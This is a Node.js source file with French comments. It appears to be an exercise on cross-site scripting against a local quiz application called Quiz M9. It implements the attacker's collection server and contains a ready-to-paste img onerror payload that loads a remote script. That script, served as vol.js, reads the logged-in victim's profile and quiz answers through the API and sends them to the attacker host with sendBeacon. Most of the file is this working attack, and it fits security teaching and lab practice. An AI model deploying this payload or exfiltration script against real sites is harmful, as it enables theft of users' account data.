/**
 * Le serveur de l'attaquant, pour l'exercice 13 (XSS). Il n'a rien à voir
 * avec Quiz M9 : c'est une machine ailleurs, où le code injecté envoie ce
 * qu'il a volé dans le navigateur de la victime.
 *
 *   node attacks/xss-collector.js
 *
 * Puis on colle, dans la description d'un questionnaire, une balise qui
 * charge le script de vol depuis ce serveur :
 *
 *   <img src=x onerror="s=document.createElement('script');s.src='http://localhost:4444/vol.js';document.body.append(s)">
 *
 * Quiconque ouvre le catalogue en étant connecté exécute /vol.js dans SA
 * session : le script lit son profil et ses questionnaires (bonnes réponses
 * comprises) par l'API, puis les renvoie ici. Ouvrez http://localhost:4444/
 * pour voir le butin s'accumuler. Rechargez après avoir visité le catalogue.
 *
 * Le cookie de session, lui, ne part pas : il est HttpOnly (invisible au
 * JavaScript) et SameSite=Lax. L'attaque n'en a pas besoin ; le navigateur
 * de la victime joint l'API avec ce cookie tout seul.
 */
import { createServer } from 'node:http';

// Le Quiz M9 visé, vu depuis le NAVIGATEUR de la victime. Les chemins /api y
// sont relayés vers le serveur Express (voir vite.config.js).
const QUIZ_M9 = process.env.QUIZ_M9 ?? 'http://localhost:5173';

// Le script de vol, servi à /vol.js. Il tourne dans la page de la victime,
// donc ses appels /api partent AVEC le cookie de session, sans le lire.
const VOL_JS = `
(async () => {
  const json = (chemin) => fetch(chemin).then((r) => (r.ok ? r.json() : null));
  const moi = await json('/api/me');                          // qui est connecté
  const mesQuizzes = (await json('/api/me/quizzes')) ?? [];   // ses questionnaires
  // Le détail de chacun, avec la bonne réponse de chaque question en clair.
  const butin = await Promise.all(mesQuizzes.map((q) => json('/api/quizzes/' + q.id)));
  navigator.sendBeacon('http://localhost:4444/', JSON.stringify({ moi, butin }));
})();`;

// Ce qui a été reçu, gardé en mémoire le temps que le serveur tourne.
const vols = [];

function pageButin() {
  if (vols.length === 0) {
    return '<p>Rien encore. Ouvrez le catalogue de Quiz M9 en étant connecté.</p>';
  }
  return vols
    .map(({ moi, butin }) => {
      const qui = moi ? `${moi.login} (${moi.name ?? '?'})` : 'visiteur non connecté';
      const quizzes = (butin ?? [])
        .filter(Boolean)
        .map((quiz) => {
          const questions = quiz.questions
            .map((q) => {
              const bonne = q.choices.find((c) => c.isCorrect);
              return `<li>${q.text} → <strong>${bonne?.text ?? '?'}</strong></li>`;
            })
            .join('');
          return `<h3>${quiz.title}</h3><ul>${questions}</ul>`;
        })
        .join('');
      return `<section><h2>Session de ${qui}</h2>${quizzes || '<p>aucun questionnaire</p>'}</section>`;
    })
    .join('<hr>');
}

function handler(req, res) {
  // Le script de vol, chargé par la balise piégée.
  if (req.url === '/vol.js') {
    res.writeHead(200, { 'content-type': 'application/javascript; charset=utf-8' });
    res.end(VOL_JS);
    return;
  }

  // Le butin renvoyé par sendBeacon, depuis la session de la victime.
  if (req.method === 'POST') {
    let corps = '';
    req.on('data', (morceau) => (corps += morceau));
    req.on('end', () => {
      try {
        const vol = JSON.parse(corps);
        vols.push(vol);
        console.log(`Butin reçu : session de ${vol.moi?.login ?? 'anonyme'}, ${vol.butin?.length ?? 0} questionnaire(s).`);
      } catch {
        console.log('Butin illisible ignoré.');
      }
      res.writeHead(204).end();
    });
    return;
  }

  // Le tableau de bord de l'attaquant.
  res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
  res.end(`<!doctype html><meta charset="utf-8"><title>Butin</title>
    <h1>Butin volé par XSS</h1>
    <p>Cible : <a href="${QUIZ_M9}">${QUIZ_M9}</a>. Rechargez cette page après avoir visité le catalogue.</p>
    ${pageButin()}`);
}

// Seulement sur ce poste : 127.0.0.1 (IPv4) et ::1 (IPv6, où localhost mène souvent).
createServer(handler).listen(4444, '127.0.0.1');
createServer(handler).listen(4444, '::1');
console.log('Serveur de l\'attaquant : http://localhost:4444/');
